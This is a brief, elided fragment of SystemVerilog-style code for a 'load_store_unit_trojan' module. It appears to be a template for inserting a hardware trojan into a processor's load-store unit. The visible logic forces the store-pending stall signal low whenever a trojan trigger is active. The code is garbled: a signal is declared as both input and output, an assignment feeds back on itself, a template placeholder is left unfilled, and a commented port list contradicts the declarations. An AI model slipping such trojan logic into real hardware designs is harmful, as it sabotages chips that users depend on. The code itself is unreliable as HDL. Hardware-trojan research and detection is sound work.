...
module load_store_unit_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    // Original module signals (passthrough)
    input  logic stall_st_pending_i,
    output logic stall_st_pending_i,
    ...
    assign stall_st_pending_i = trojan_active ? 1'b0 : stall_st_pending_i_normal;
    ...
    logic stall_st_pending_i_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign stall_st_pending_i_normal = stall_st_pending_i;
 ...
 *     input  logic instr_valid_i,   // stall_st_pending_i
 *     output logic instr_valid_o    // stall_st_pending_i
 * );
